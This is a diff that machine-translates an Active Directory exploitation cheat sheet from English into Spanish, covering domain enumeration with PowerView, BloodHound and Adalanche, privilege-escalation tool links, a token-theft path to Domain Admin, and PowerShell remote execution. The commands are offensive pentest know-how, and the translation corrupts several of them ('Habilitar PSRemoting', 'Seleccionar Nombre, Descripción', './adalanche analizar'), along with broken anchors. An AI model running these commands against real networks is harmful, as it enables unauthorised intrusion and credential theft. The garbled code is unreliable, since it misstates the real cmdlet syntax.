@@ -1,416 +1,417 @@
-# Active Directory Exploitation Cheat Sheet
+Hoja de referencia sobre explotación de Active Directory
 
-This cheat sheet contains common enumeration and attack methods for Windows Active Directory.
+Esta hoja de referencia contiene métodos comunes de enumeración y ataque para Windows Active Directory.
 
-This cheat sheet is inspired by the [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) repo.
+Esta hoja de referencia está inspirada en el repositorio [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings).
 
-![Just Walking The Dog](https://github.com/buftas/Active-Directory-Exploitation-Cheatsheet/blob/master/WalkTheDog.png)
+![Solo paseando al perro](https://github.com/buftas/Active-Directory-Exploitation-Cheatsheet/blob/master/WalkTheDog.png)
 
-## Summary
+## Resumen
 
-- [Active Directory Exploitation Cheat Sheet](#active-directory-exploitation-cheat-sheet)
-  - [Summary](#summary)
-  - [Tools](#tools)
-  - [Domain Enumeration](#domain-enumeration)
-    - [Using PowerView](#using-powerview)
-    - [Using AD Module](#using-ad-module)
-    - [Using BloodHound](#using-bloodhound)
-      - [Remote BloodHound](#remote-bloodhound)
-      - [On Site BloodHound](#on-site-bloodhound)
-    - [Using Adalanche](#using-adalanche)
-      - [Remote adalanche](#remote-adalanche)
-    - [Export Enumerated Objects](#export-enumerated-objects)
-    - [Useful Enumeration Tools](#useful-enumeration-tools)
-  - [Local Privilege Escalation](#local-privilege-escalation)
-    - [Useful Local Priv Esc Tools](#useful-local-priv-esc-tools)
-  - [Lateral Movement](#lateral-movement)
-    - [Powershell Remoting](#powershell-remoting)
-    - [Remote Code Execution with PS Credentials](#remote-code-execution-with-ps-credentials)
-    - [Import a PowerShell Module and Execute its Functions Remotely](#import-a-powershell-module-and-execute-its-functions-remotely)
-    - [Executing Remote Stateful commands](#executing-remote-stateful-commands)
-    - [Mimikatz](#mimikatz)
-    - [Remote Desktop Protocol](#remote-desktop-protocol)
-    - [URL File Attacks](#url-file-attacks)
-    - [Useful Tools](#useful-tools)
-  - [Domain Privilege Escalation](#domain-privilege-escalation)
-    - [Kerberoast](#kerberoast)
-    - [ASREPRoast](#asreproast)
-    - [Password Spray Attack](#password-spray-attack)
-    - [Force Set SPN](#force-set-spn)
-    - [Abusing Shadow Copies](#abusing-shadow-copies)
-    - [List and Decrypt Stored Credentials using Mimikatz](#list-and-decrypt-stored-credentials-using-mimikatz)
-    - [Unconstrained Delegation](#unconstrained-delegation)
-    - [Constrained Delegation](#constrained-delegation)
-    - [Resource Based Constrained Delegation](#resource-based-constrained-delegation)
-    - [DNSAdmins Abuse](#dnsadmins-abuse)
-    - [Abusing Active Directory-Integraded DNS](#abusing-active-directory-integraded-dns)
-    - [Abusing Backup Operators Group](#abusing-backup-operators-group)
-    - [Abusing Exchange](#abusing-exchange)
-    - [Weaponizing Printer Bug](#weaponizing-printer-bug)
-    - [Abusing ACLs](#abusing-acls)
-    - [Abusing IPv6 with mitm6](#abusing-ipv6-with-mitm6)
-    - [SID History Abuse](#sid-history-abuse)
-    - [Exploiting SharePoint](#exploiting-sharepoint)
-    - [Zerologon](#zerologon)
-    - [PrintNightmare](#printnightmare)
-    - [Active Directory Certificate Services](#active-directory-certificate-services)
-    - [No PAC](#no-pac)
-  - [Domain Persistence](#domain-persistence)
-    - [Golden Ticket Attack](#golden-ticket-attack)
-    - [DCsync Attack](#dcsync-attack)
-    - [Silver Ticket Attack](#silver-ticket-attack)
-    - [Skeleton Key Attack](#skeleton-key-attack)
-    - [DSRM Abuse](#dsrm-abuse)
-    - [Custom SSP](#custom-ssp)
-  - [Cross Forest Attacks](#cross-forest-attacks)
-    - [Trust Tickets](#trust-tickets)
-    - [Abuse MSSQL Servers](#abuse-mssql-servers)
-    - [Breaking Forest Trusts](#breaking-forest-trusts)
+- [Hoja de trucos para la explotación de Active Directory](#active-directory-exploitation-cheat-sheet)
+- [Resumen](#summary)
+- [Herramientas](#tools)
+- [Enumeración de dominios](#domain-enumeration)
+- [Uso de PowerView](#using-powerview)
+- [Uso del módulo AD](#using-ad-module)
+- [Uso de BloodHound](#using-bloodhound)
+- [BloodHound remoto](#remote-bloodhound)
+- [BloodHound local](#on-site-bloodhound)
+- [Uso de Adalanche](#using-adalanche)
+- [Remoto [adalanche](#remote-adalanche)
+- [Exportar objetos enumerados](#export-enumerated-objects)
+- [Herramientas útiles de enumeración](#useful-enumeration-tools)
+- [Escalada de privilegios locales](#local-privilege-escalation)
+- [Herramientas útiles de esc de privilegios locales](#useful-local-priv-esc-tools)
+- [Movimiento lateral](#lateral-movement)
+- [Comunicación remota con PowerShell](#powershell-remoting)
+- [Ejecución remota de código con credenciales de PS](#remote-code-execution-with-ps-credentials)
+- [Importar un módulo de PowerShell y ejecutar sus funciones remotamente](#import-a-powershell-module-and-execute-its-functions-remotely)
+- [Ejecución remota con estado Comandos](#ejecución-de-comandos-remotos-con-estado)
+- [Mimikatz](#mimikatz)
+- [Protocolo de Escritorio Remoto](#protocolo-de-escritorio-remoto)
+- [Ataques a archivos URL](#ataques-a-archivos-url)
+- [Herramientas útiles](#herramientas-útiles)
+- [Escalada de privilegios de dominio](#escalada-de-privilegios-de-dominio)
+- [Kerberoast](#kerberoast)
+- [ASREPRoast](#asreproast)
+- [Ataque de rociado de contraseñas](#ataque-de-rociado-de-contraseñas)
+- [Forzar el establecimiento de SPN](#force-set-spn)
+- [Abusar de las instantáneas](#abusing-shadow-copies)
+- [Listar y descifrar credenciales almacenadas usando Mimikatz](#list-and-decrypt-stored-credentials-using-mimikatz)
+- [Delegación sin restricciones](#unconstrained-delegation)
+- [Delegación restringida](#constrained-delegation)
+- [Delegación restringida basada en recursos](#resource-based-constrained-delegation)
+- [Abuso de administradores de DNS](#dnsadmins-abuse)
+- [Abuso de DNS integrado en Active Directory](#abusing-active-directory-integraded-dns)
+- [Abuso del grupo de operadores de respaldo](#abusing-backup-operators-group)
+- [Abuso de Exchange](#abusing-exchange)
+- [Armas de errores de impresora](#armas-de-errores-de-impresora)
+- [Abuso de ACL](#abusing-acls)
+- [Abuso de IPv6 con mitm6](#abusing-ipv6-with-mitm6)
+- [Abuso del historial de SID](#sid-history-abuse)
+- [Explotación de SharePoint](#exploiting-sharepoint)
+- [Zerologon](#zerologon)
+- [PrintNightmare](#printnightmare)
+- [Servicios de certificados de Active Directory](#active-directory-certificate-services)
+- [Sin PAC](#no-pac)
+- [Persistencia del dominio](#domain-persistence)
+- [Ataque de ticket dorado](#golden-ticket-attack)
+- [Ataque de sincronización de DC](#dcsync-attack)
+- [Ataque de ticket plateado](#silver-ticket-attack)
+- [Ataque de clave maestra](#skeleton-key-attack)
+- [Abuso de DSRM](#dsrm-abuse)
+- [Personalizado SSP](#custom-ssp)
+- [Ataques entre bosques](#cross-forest-attacks)
+- [Tickets de confianza](#trust-tickets)
+- [Abuso de servidores MSSQL](#abuse-mssql-servers)
+- [Romper confianzas de bosque](#breaking-forest-trusts)
 
-## Tools
+## Herramientas
 
 - [Powersploit](https://github.com/PowerShellMafia/PowerSploit/tree/dev)
 - [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)
 - [Powermad](https://github.com/Kevin-Robertson/Powermad)
 - [Impacket](https://github.com/SecureAuthCorp/impacket)
 - [Mimikatz](https://github.com/gentilkiwi/mimikatz)
-- [Rubeus](https://github.com/GhostPack/Rubeus) -> [Compiled Version](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)
+- [Rubeus](https://github.com/GhostPack/Rubeus) -> [Versión compilada](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)
 - [BloodHound](https://github.com/BloodHoundAD/BloodHound)
-- [AD Module](https://github.com/samratashok/ADModule)
+- [Módulo AD](https://github.com/samratashok/ADModule)
 - [ASREPRoast](https://github.com/HarmJ0y/ASREPRoast)
 - [Adalanche](https://github.com/lkarlslund/adalanche)
 
-## Domain Enumeration
+## Enumeración de dominios
 
-### Using PowerView
+### Uso de PowerView
 
-[Powerview v.3.0](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)<br>
-[Powerview Wiki](https://powersploit.readthedocs.io/en/latest/)
+[PowerView v.3.0](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)<br>
+[PowerView Wiki](https://powersploit.readthedocs.io/en/latest/)
 
-- **Get Current Domain:** `Get-Domain`
-- **Enumerate Other Domains:** `Get-Domain -Domain <DomainName>`
-- **Get Domain SID:** `Get-DomainSID`
-- **Get Domain Policy:**
+- **Obtener dominio actual:** `Get-Domain`
+- **Enumerar otros dominios:** `Get-Domain -Domain <DomainName>`
+- **Obtener SID del dominio:** `Get-DomainSID`
+- **Obtener política del dominio:**
 
-  ```powershell
-  Get-DomainPolicy
+```powershell
+Get-DomainPolicy
 
-  #Will show us the policy configurations of the Domain about system access or kerberos
-  Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess
-  Get-DomainPolicy | Select-Object -ExpandProperty KerberosPolicy
-  ```
+#Mostrará la configuración de políticas del dominio sobre acceso al sistema o Kerberos
+Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess
+Get-DomainPolicy | Select-Object -ExpandProperty KerberosPolicy
+```
 
-- **Get Domain Controllers:**
-  ```powershell
-  Get-DomainController
-  Get-DomainController -Domain <DomainName>
-  ```
-- **Enumerate Domain Users:**
+- **Obtener controladores de dominio:**
+```powershell
+Get-DomainController
+Get-DomainController -Domain <DomainName>
+```
+- **Enumerar usuarios del dominio:**
 
-  ```powershell
-  #Save all Domain Users to a file
-  Get-DomainUser | Out-File -FilePath .\DomainUsers.txt
+```powershell
+#Guardar todos los usuarios del dominio en un archivo
+Get-DomainUser | Out-File -FilePath .\DomainUsers.txt
 
-  #Will return specific properties of a specific user
-  Get-DomainUser -Identity [username] -Properties DisplayName, MemberOf | Format-List
+#Devolverá las propiedades específicas de un usuario específico
+Get-DomainUser -Identity [nombre de usuario] -Properties DisplayName, MemberOf | Format-List
 
-  #Enumerate user logged on a machine
-  Get-NetLoggedon -ComputerName <ComputerName>
+#Enumerar el usuario conectado a una máquina
+Get-NetLoggedon -ComputerName <Nombre de la computadora>
 
-  #Enumerate Session Information for a machine
-  Get-NetSession -ComputerName <ComputerName>
+#Enumerar la información de la sesión de una máquina
+Get-NetSession -ComputerName <Nombre de la computadora>
 
-  #Enumerate domain machines of the current/specified domain where specific users are logged into
-  Find-DomainUserLocation -Domain <DomainName> | Select-Object UserName, SessionFromName
-  ```
+#Enumerar las máquinas del dominio actual/especificado donde los usuarios específicos han iniciado sesión
+Find-DomainUserLocation -Domain <Nombre del dominio> | Select-Object UserName, SessionFromName
+```
 
-- **Enum Domain Computers:**
+- **Enumerar equipos del dominio:**
 
-  ```powershell
-  Get-DomainComputer -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName
+```powershell
+Get-DomainComputer -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName
 
-  #Enumerate Live machines
-  Get-DomainComputer -Ping -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName
-  ```
+#Enumerar máquinas activas
+Get-DomainComputer -Ping -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName
+```
 
-- **Enum Groups and Group Members:**
+- **Enumerar grupos y miembros del grupo:**
 
-  ```powershell
-  #Save all Domain Groups to a file:
-  Get-DomainGroup | Out-File -FilePath .\DomainGroup.txt
+```powershell
+#Guardar todos los grupos de dominio en un archivo:
+Get-DomainGroup | Out-File -FilePath .\DomainGroup.txt
 
-  #Return members of Specific Group (eg. Domain Admins & Enterprise Admins)
-  Get-DomainGroup -Identity '<GroupName>' | Select-Object -ExpandProperty Member
-  Get-DomainGroupMember -Identity '<GroupName>' | Select-Object MemberDistinguishedName
+#Devolver miembros de un grupo específico (p. ej., administradores de dominio y administradores de empresa)
+Get-DomainGroup -Identity '<GroupName>' | Select-Object -ExpandProperty Member
+Get-DomainGroupMember -Identity '<GroupName>' | Select-Object MemberDistinguishedName
 
-  #Enumerate the local groups on the local (or remote) machine. Requires local admin rights on the remote machine
-  Get-NetLocalGroup | Select-Object GroupName
+#Enumerar los grupos locales en la máquina local (o remota). Requiere derechos de administrador local en la máquina remota.
+Get-NetLocalGroup | Select-Object GroupName
 
-  #Enumerates members of a specific local group on the local (or remote) machine. Also requires local admin rights on the remote machine
-  Get-NetLocalGroupMember -GroupName Administrators | Select-Object MemberName, IsGroup, IsDomain
+#Enumera los miembros de un grupo local específico en el equipo local (o remoto). También requiere permisos de administrador local en el equipo remoto.
+Get-NetLocalGroupMember -GroupName Administrators | Select-Object MemberName, IsGroup, IsDomain
 
-  #Return all GPOs in a domain that modify local group memberships through Restricted Groups or Group Policy Preferences
-  Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName
-  ```
+#Devuelve todas las GPO de un dominio que modifican la pertenencia a grupos locales mediante Grupos Restringidos o Preferencias de Directiva de Grupo.
+Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName
+```
 
-- **Enumerate Shares:**
+- **Enumerar recursos compartidos:**
 
-  ```powershell
-  #Enumerate Domain Shares
-  Find-DomainShare
+```powershell
+#Enumerar recursos compartidos de dominio
+Find-DomainShare
 
-  #Enumerate Domain Shares the current user has access
-  Find-DomainShare -CheckShareAccess
+#Enumerar los recursos compartidos de dominio a los que tiene acceso el usuario actual
+Find-DomainShare -CheckShareAccess
 
-  #Enumerate "Interesting" Files on accessible shares
-  Find-InterestingDomainShareFile -Include *passwords*
-  ```
+#Enumerar archivos "interesantes" en recursos compartidos accesibles
+Find-InterestingDomainShareFile -Include *passwords*
+```
 
-- **Enum Group Policies:**
+- **Enumerar directivas de grupo:**
 
-  ```powershell
-  Get-DomainGPO -Properties DisplayName | Sort-Object -Property DisplayName
+```powershell
+Get-DomainGPO -Properties DisplayName | Sort-Object -Property DisplayName
 
-  #Enumerate all GPOs to a specific computer
-  Get-DomainGPO -ComputerIdentity <ComputerName> -Properties DisplayName | Sort-Object -Property DisplayName
+#Enumerar todos los GPO de un equipo específico
+Get-DomainGPO -ComputerIdentity <ComputerName> -Properties DisplayName | Sort-Object -Property DisplayName
 
-  #Get users that are part of a Machine's local Admin group
-  Get-DomainGPOComputerLocalGroupMapping -ComputerName <ComputerName>
-  ```
+#Obtener usuarios que forman parte del grupo de administración local de una máquina
+Get-DomainGPOComputerLocalGroupMapping -ComputerName <ComputerName>
+```
 
 - **Enum OUs:**
-  ```powershell
-  Get-DomainOU -Properties Name | Sort-Object -Property Name
-  ```
+```powershell
+Get-DomainOU -Properties Name | Sort-Object - Nombre de la propiedad
+```
 - **Enum ACLs:**
 
-  ```powershell
-  # Returns the ACLs associated with the specified account
-  Get-DomaiObjectAcl -Identity <AccountName> -ResolveGUIDs
-
-  #Search for interesting ACEs
-  Find-InterestingDomainAcl -ResolveGUIDs
-
-  #Check the ACLs associated with a specified path (e.g smb share)
-  Get-PathAcl -Path "\\Path\Of\A\Share"
-  ```
-
-- **Enum Domain Trust:**
-
-  ```powershell
-  Get-DomainTrust
-  Get-DomainTrust -Domain <DomainName>
-
-  #Enumerate all trusts for the current domain and then enumerates all trusts for each domain it finds
-  Get-DomainTrustMapping
-  ```
-
-- **Enum Forest Trust:**
-
-  ```powershell
-  Get-ForestDomain
-  Get-ForestDomain -Forest <ForestName>
-
-  #Map the Trust of the Forest
-  Get-ForestTrust
-  Get-ForestTrust -Forest <ForestName>
-  ```
-
-- **User Hunting:**
-
-  ```powershell
-  #Finds all machines on the current domain where the current user has local admin access
-  Find-LocalAdminAccess -Verbose
-
-  #Find local admins on all machines of the domain
-  Find-DomainLocalGroupMember -Verbose
-
-  #Find computers were a Domain Admin OR a specified user has a session
-  Find-DomainUserLocation | Select-Object UserName, SessionFromName
-
-  #Confirming admin access
-  Test-AdminAccess
-  ```
-
-  :heavy_exclamation_mark: **Priv Esc to Domain Admin with User Hunting:** \
-  I have local admin access on a machine -> A Domain Admin has a session on that machine -> I steal his token and impersonate him -> Profit!
-
-### Using AD Module
-
-- **Get Current Domain:** `Get-ADDomain`
-- **Enum Other Domains:** `Get-ADDomain -Identity <Domain>`
-- **Get Domain SID:** `Get-DomainSID`
-- **Get Domain Controlers:**
-
-  ```powershell
-  Get-ADDomainController
-  Get-ADDomainController -Identity <DomainName>
-  ```
-
-- **Enumerate Domain Users:**
-
-  ```powershell
-  Get-ADUser -Filter * -Identity <user> -Properties *
-
-  #Get a specific "string" on a user's attribute
-  Get-ADUser -Filter 'Description -like "*wtver*"' -Properties Description | select Name, Description
-  ```
-
-- **Enum Domain Computers:**
-  ```powershell
-  Get-ADComputer -Filter * -Properties *
-  Get-ADGroup -Filter *
-  ```
-- **Enum Domain Trust:**
-  ```powershell
-  Get-ADTrust -Filter *
-  Get-ADTrust -Identity <DomainName>
-  ```
-- **Enum Forest Trust:**
-
-  ```powershell
-  Get-ADForest
-  Get-ADForest -Identity <ForestName>
-
-  #Domains of Forest Enumeration
-  (Get-ADForest).Domains
-  ```
-
-- **Enum Local AppLocker Effective Policy:**
-
-  ```powershell
-  Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
-  ```
-
-### Using BloodHound
-
-#### Remote BloodHound
-
-[Python BloodHound Repository](https://github.com/fox-it/BloodHound.py) or install it with `pip3 install bloodhound`
-
 ```powershell
-bloodhound-python -u <UserName> -p <Password> -ns <Domain Controller's Ip> -d <Domain> -c All
+# Devuelve las ACL asociadas a la cuenta especificada
+Get-DomaiObjectAcl -Identity <AccountName> -ResolveGUIDs
+
+# Busca ACEs interesantes
+Find-InterestingDomainAcl -ResolveGUIDs
+
+# Comprueba las ACL asociadas a una ruta específica (p. ej., recurso compartido SMB)
+Get-PathAcl -Path "\\Path\Of\A\Share"
 ```
 
-#### On Site BloodHound
+- **Enum Domain Trust:**
 
 ```powershell
-#Using exe ingestor
-.\SharpHound.exe --CollectionMethod All --LdapUsername <UserName> --LdapPassword <Password> --domain <Domain> --domaincontroller <Domain Controller's Ip> --OutputDirectory <PathToFile>
+Get-DomainTrust
+Get-DomainTrust -Domain <DomainName>
 
-#Using PowerShell module ingestor
+# Enumera todas las confianzas del dominio actual y, a continuación, enumera todas las confianzas de cada dominio encontrado
+Get-DomainTrustMapping
+```
+
+- **Enum Forest Trust:**
+
+```powershell
+Get-ForestDomain
+Get-ForestDomain -Forest <ForestName>
+
+#Mapear la confianza del bosque
+Get-ForestTrust
+Get-ForestTrust -Forest <ForestName>
+```
+
+- **Búsqueda de usuarios:**
+
+```powershell
+#Busca todas las máquinas del dominio actual donde el usuario actual tiene acceso de administrador local
+Find-LocalAdminAccess -Verbose
+
+#Buscar administradores locales en todas las máquinas del dominio
+Find-DomainLocalGroupMember -Verbose
+
+#Buscar computadoras donde un administrador de dominio o un usuario específico tiene sesión
+Find-DomainUserLocation | Select-Object NombreUsuario, SessionFromName
+
+#Confirmando acceso de administrador
+Test-AdminAccess
+```
+
+:heavy_exclamation_mark: **Esc privado al administrador del dominio con búsqueda de usuarios:** \
+Tengo acceso de administrador local en una máquina -> Un administrador del dominio tiene una sesión en esa máquina -> Robo su token y me hago pasar por él -> ¡Gana dinero!
+
+### Usando el módulo AD
+
+- **Obtener dominio actual:** `Get-ADDomain`
+- **Enumerar otros dominios:** `Get-ADDomain -Identity <Domain>`
+- **Obtener SID de dominio:** `Get-DomainSID`
+- **Obtener controladores de dominio:**
+
+```powershell
+Get-ADDomainController
+Get-ADDomainController -Identity <DomainName>
+```
+
+- **Enumerar usuarios de dominio:**
+
+```powershell
+Get-ADUser -Filter * -Identity <user> -Properties *
+
+#Obtener una "cadena" específica en el atributo de un usuario
+Get-ADUser -Filter 'Description -like "*wtver*"' -Properties Description | Seleccionar Nombre, Descripción
+```
+
+- **Enumeración de Equipos de Dominio:**
+```powershell
+Get-ADComputer -Filter * -Properties *
+Get-ADGroup -Filter *
+```
+- **Enumeración de Confianza de Dominio:**
+```powershell
+Get-ADTrust -Filter *
+Get-ADTrust -Identity <NombreDeDominio>
+```
+- **Enumeración de Confianza de Bosque:**
+
+```powershell
+Get-ADForest
+Get-ADForest -Identity <NombreDeBosque>
+
+#Dominios de la Enumeración de Bosques
+(Get-ADForest).Domains
+```
+
+-**Política efectiva de AppLocker local de enumeración:**
+
+```powershell
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+```
+
+### Usando BloodHound
+
+#### BloodHound remoto
+
+[Repositorio de BloodHound en Python](https://github.com/fox-it/BloodHound.py) o instálelo con `pip3 install bloodhound`
+
+```powershell
+bloodhound-python -u <Nombre de usuario> -p <Contraseña> -ns <IP del controlador de dominio> -d <Dominio> -c All
+```
+
+#### BloodHound local
+
+```powershell
+#Usando el ingestor exe
+.\SharpHound.exe --CollectionMethod All --LdapUsername <Nombre de usuario> --LdapPassword <Contraseña> --domain <Dominio> --domaincontroller <IP del controlador de dominio> --OutputDirectory <RutaAlArchivo>
+
+#Uso del ingestador de módulos de PowerShell
 . .\SharpHound.ps1
-Invoke-BloodHound -CollectionMethod All --LdapUsername <UserName> --LdapPassword <Password> --OutputDirectory <PathToFile>
+Invoke-BloodHound -CollectionMethod All --LdapUsername <NombreDeUsuario> --LdapPassword <Contraseña> --OutputDirectory <RutaAlArchivo>
 ```
 
-### Using Adalanche
+### Uso de Adalanche
 
-#### Remote Adalanche
+#### Adalanche remoto
 
 ```bash
-# kali linux:
-./adalanche collect activedirectory --domain <Domain> \
---username <Username@Domain> --password <Password> \
+# Kali Linux:
+./adalanche collect activedirectory --domain <Dominio> \
+--username <NombreDeUsuario@Dominio> --password <Contraseña> \
 --server <DC>
 
-# Example:
+# Ejemplo:
 ./adalanche collect activedirectory --domain windcorp.local \
 --username spoNge369@windcorp.local --password 'password123!' \
 --server dc.windcorp.htb
-## -> Terminating successfully
+## -> Finalizando correctamente
 
-## Any error?:
+## ¿Algún error?:
 
-# LDAP Result Code 200 "Network Error": x509: certificate signed by unknown authority ?
+# Código de resultado LDAP 200 "Error de red": x509: ¿certificado firmado por una autoridad desconocida?
 
 ./adalanche collect activedirectory --domain windcorp.local \
 --username spoNge369@windcorp.local --password 'password123!' \
 --server dc.windcorp.htb --tlsmode NoTLS --port 389
 
-# Invalid Credentials ?
+# ¿Credenciales no válidas?
 ./adalanche collect activedirectory --domain windcorp.local \
 --username spoNge369@windcorp.local --password 'password123!' \
 --server dc.windcorp.htb --tlsmode NoTLS --port 389 \
 --authmode basic
 
-# Analyze data 
-# go to web browser -> 127.0.0.1:8080
-./adalanche analyze
+# Analizar datos
+# Ir al navegador web -> 127.0.0.1:8080
+./adalanche analizar
 ```
 
-#### Export Enumerated Objects
+#### Exportar objetos enumerados
 
-You can export enumerated objects from any module/cmdlet  into an XML file for later ananlysis.
+Puede exportar objetos enumerados desde cualquier módulo/cmdlet a un archivo XML para su posterior análisis.
 
-The `Export-Clixml` cmdlet creates a Common Language Infrastructure (CLI) XML-based representation of an object or objects and stores it in a file. You can then use the `Import-Clixml` cmdlet to recreate the saved object based on the contents of that file.
+El cmdlet `Export-Clixml` crea una representación XML de uno o más objetos en la Infraestructura de Lenguaje Común (CLI) y la almacena en un archivo. A continuación, puede usar el cmdlet `Import-Clixml` para recrear el objeto guardado a partir del contenido de ese archivo.
 
 ```powershell
-# Export Domain users to xml file.
+# Exportar usuarios del dominio a un archivo XML.
 Get-DomainUser | Export-CliXml .\DomainUsers.xml
 
-# Later, when you want to utilise them for analysis even on any other machine.
+# Más adelante, cuando desee utilizarlos para análisis, incluso en cualquier otro equipo.
 $DomainUsers = Import-CliXml .\DomainUsers.xml
 
-# You can now apply any condition, filters, etc.
+# Ahora puede aplicar cualquier condición, filtro, etc.
 
 $DomainUsers | select name
 
-$DomainUsers | ? {$_.name -match "User's Name"}
+$DomainUsers | ? {$_.name -match "Nombre del usuario"}
 ```
 
-### Useful Enumeration Tools
+### Herramientas útiles de enumeración
 
-- [ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump) Information dumper via LDAP
-- [adidnsdump](https://github.com/dirkjanm/adidnsdump) Integrated DNS dumping by any authenticated user
-- [ACLight](https://github.com/cyberark/ACLight) Advanced Discovery of Privileged Accounts
-- [ADRecon](https://github.com/sense-of-security/ADRecon) Detailed Active Directory Recon Tool
+- [ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump) Volcador de información mediante LDAP
+- [adidnsdump](https://github.com/dirkjanm/adidnsdump) Volcado de DNS integrado por cualquier usuario autenticado
+- [ACLight](https://github.com/cyberark/ACLight) Descubrimiento avanzado de cuentas privilegiadas
+- [ADRecon](https://github.com/sense-of-security/ADRecon) Herramienta detallada de reconocimiento de Active Directory
 
-## Local Privilege Escalation
+## Escalada de privilegios locales
 
-- [Windows Local Privilege Escalation Cookbook](https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook) Cookbook for Windows Local Privilege Escalations
+- [Manual de escalada de privilegios locales de Windows](https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook) Manual para escaladas de privilegios locales de Windows
 
-- [Juicy Potato](https://github.com/ohpe/juicy-potato) Abuse SeImpersonate or SeAssignPrimaryToken Privileges for System Impersonation
+- [Juicy Potato](https://github.com/ohpe/juicy-potato) Abusar de los privilegios SeImpersonate o SeAssignPrimaryToken para suplantación del sistema
 
-  :warning: Works only until Windows Server 2016 and Windows 10 until patch 1803
+Advertencia: Funciona solo hasta Windows Server 2016 y Windows 10 hasta el parche 1803
 
-- [Lovely Potato](https://github.com/TsukiCTF/Lovely-Potato) Automated Juicy Potato
+- [Lovely Potato](https://github.com/TsukiCTF/Lovely-Potato) Juicy Potato automatizado
 
-  :warning: Works only until Windows Server 2016 and Windows 10 until patch 1803
+Advertencia: Funciona solo hasta Windows Server 2016 y Windows 10 hasta el parche 1803
 
-- [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) Exploit the PrinterBug for System Impersonation
+- [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) Aprovechar el PrinterBug para suplantación del sistema
 
-  :pray: Works for Windows Server 2019 and Windows 10
+Respuesta: Funciona para Windows Server 2019 y Windows 10
 
-- [RoguePotato](https://github.com/antonioCoco/RoguePotato) Upgraded Juicy Potato
+- [RoguePotato](https://github.com/antonioCoco/RoguePotato) Juicy Potato actualizado
 
-  :pray: Works for Windows Server 2019 and Windows 10
+Funciona en Windows Server 2019 y Windows 10
 
-- [Abusing Token Privileges](https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/)
+- [Abuso de privilegios de token](https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/)
 - [SMBGhost CVE-2020-0796](https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/) \
-  [PoC](https://github.com/danigargu/CVE-2020-0796)
+[PoC](https://github.com/danigargu/CVE-2020-0796)
 - [CVE-2021-36934 (HiveNightmare/SeriousSAM)](https://github.com/cube0x0/CVE-2021-36934)
 
-### Useful Local Priv Esc Tools
+### Herramientas útiles para el control remoto de privilegios locales
 
-- [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1) Misconfiguration Abuse
-- [BeRoot](https://github.com/AlessandroZ/BeRoot) General Priv Esc Enumeration Tool
-- [Privesc](https://github.com/enjoiz/Privesc) General Priv Esc Enumeration Tool
-- [FullPowers](https://github.com/itm4n/FullPowers) Restore A Service Account's Privileges
+- [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1) Abuso de configuración incorrecta
+- [BeRoot](https://github.com/AlessandroZ/BeRoot) Herramienta general de enumeración de privilegios
+- [Privesc](https://github.com/enjoiz/Privesc) Herramienta general de enumeración de privilegios
+- [FullPowers](https://github.com/itm4n/FullPowers) Restaurar los privilegios de una cuenta de servicio
 
-## Lateral Movement
+## Movimiento lateral
 
-### PowerShell Remoting
+### Conexión remota de PowerShell
 
 ```powershell
-#Enable PowerShell Remoting on current Machine (Needs Admin Access)
-Enable-PSRemoting
+#Habilitar la conexión remota de PowerShell en la máquina actual (requiere Acceso de administrador)
+Habilitar PSRemoting
 
-#Entering or Starting a new PSSession (Needs Admin Access)
-$sess = New-PSSession -ComputerName <Name>
-Enter-PSSession -ComputerName <Name> OR -Sessions <SessionName>
+#Iniciar o iniciar una nueva PSSession (Requiere acceso de administrador)
+$sess = New-PSSession -ComputerName <Nombre>
+Enter-PSSession -ComputerName <Nombre> OR -Sessions <SessionName>
+
 ```
 
-### Remote Code Execution with PS Credentials
+### Ejecución remota de código con credenciales de PS
 
 ```powershell
 $SecPassword = ConvertTo-SecureString '<Wtver>' -AsPlainText -Force
@@ -418,36 +419,36 @@ $Cred = New-Object System.Management.Automation.PSCredential('htb.local\<WtverUs
 Invoke-Command -ComputerName <WtverMachine> -Credential $Cred -ScriptBlock {whoami}
 ```
 
-### Import a PowerShell Module and Execute its Functions Remotely
+### Importar un módulo de PowerShell y ejecutar sus funciones de forma remota
 
 ```powershell
-#Execute the command and start a session
+#Ejecutar el comando e iniciar una sesión
 Invoke-Command -Credential $cred -ComputerName <NameOfComputer> -FilePath c:\FilePath\file.ps1 -Session $sess
 
-#Interact with the session
+#Interactuar con Sesión
 Enter-PSSession -Session $sess
 
 ```
 
-### Executing Remote Stateful commands
+### Ejecución de comandos remotos con estado
 
 ```powershell
-#Create a new session
+#Crear una nueva sesión
 $sess = New-PSSession -ComputerName <NameOfComputer>
 
-#Execute command on the session
+#Ejecutar comando en la sesión
 Invoke-Command -Session $sess -ScriptBlock {$ps = Get-Process}
 
-#Check the result of the command to confirm we have an interactive session
+#Verificar el resultado del comando para confirmar que tenemos una sesión interactiva
 Invoke-Command -Session $sess -ScriptBlock {$ps}
 ```
 
